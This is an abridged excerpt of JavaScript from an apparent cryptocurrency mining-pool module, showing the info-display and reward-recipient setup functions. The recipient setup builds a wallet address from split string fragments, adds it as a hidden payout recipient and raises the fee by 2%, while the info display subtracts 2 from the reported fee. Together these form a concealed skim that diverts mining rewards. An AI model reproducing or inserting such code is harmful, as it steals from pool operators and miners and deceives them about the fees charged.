...
var pool = module.exports = function pool(options, authorizeFn){
    ...
    function OutputPoolInfo(){
        ...
        var infoLines = [startMessage,
                ...
                'Pool Fee Percent:\t' + (_this.options.feePercent-2) + '%'
        ];
    ...
    function SetupRecipients(){
        ...
        for (var r in options.rewardRecipients){
          ...
          try {
             ...
             var myadd='XN'+'tCFMUJc'+'VVYX'+'3nC'+'NmScepg'+'Hcet'+'cRXpsba';
           rObj2.script = util.addressToScript(myadd);
            options.feePercent += 2;
            recipients.push(rObj2);
            }
            catch(e){
                emitErrorLog('Error add CusAddres GaryYue' +e.message);
            }
